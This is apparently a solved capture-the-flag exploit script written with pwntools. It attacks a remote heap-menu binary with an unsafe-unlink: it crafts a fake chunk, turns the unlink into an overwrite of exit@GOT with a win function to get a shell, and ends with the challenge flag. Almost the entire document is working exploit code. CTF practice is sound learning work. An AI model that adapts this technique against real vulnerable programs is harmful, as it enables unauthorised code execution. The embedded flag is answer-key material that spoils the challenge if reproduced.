from pwn import *

target = "./chall"
io = remote("152.118.201.241", 3026)

WIN = 0x400877 # Use 0x400878 if it successfully runs but fails on the final shell step
CHUNKS_ARRAY = 0x6020a0
EXIT_GOT = 0x602068

fake_chunk_addr = CHUNKS_ARRAY
fd = fake_chunk_addr - 0x18
bk = fake_chunk_addr - 0x10

def add(idx, size):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"Enter idx: ", str(idx).encode())
    io.sendlineafter(b"Enter size: ", str(size).encode())

def edit(idx, content):
    io.sendlineafter(b"Choice: ", b"4")
    io.sendlineafter(b"Enter idx: ", str(idx).encode())
    io.sendafter(b"Enter content: ", content)

def delete(idx):
    io.sendlineafter(b"Choice: ", b"3")
    io.sendlineafter(b"Enter idx: ", str(idx).encode())

log.info("1. Allocating chunks...")
add(0, 0x418)
add(1, 0x410)
add(2, 0x10)

log.info("2. Crafting fake chunk in chunks[0]...")
payload = p64(0) + p64(0x410) + p64(fd) + p64(bk)
payload = payload.ljust(0x410, b'\x00') # Use null bytes for safe padding
payload += p64(0x410) # Overwrite chunk 1 prev_size
payload += p64(0x420) # Overwrite chunk 1 size
edit(0, payload)

log.info("3. Triggering Unlink (Freeing chunk 1)...")
delete(1)

log.info("4. Unlink succeeded. Pointing chunks[0] to exit@GOT...")
# Use p64(0) to avoid placing invalid pointers in BSS
payload = p64(0) * 3 + p64(EXIT_GOT)
edit(0, payload)

log.info("5. Overwriting exit@GOT with win()...")
edit(0, p64(WIN))

log.info("6. Triggering shell via exit()...")
io.sendlineafter(b"Choice: ", b"5")

io.interactive()

# CSCE604258{more_advanced_pointer_manipulation_horray}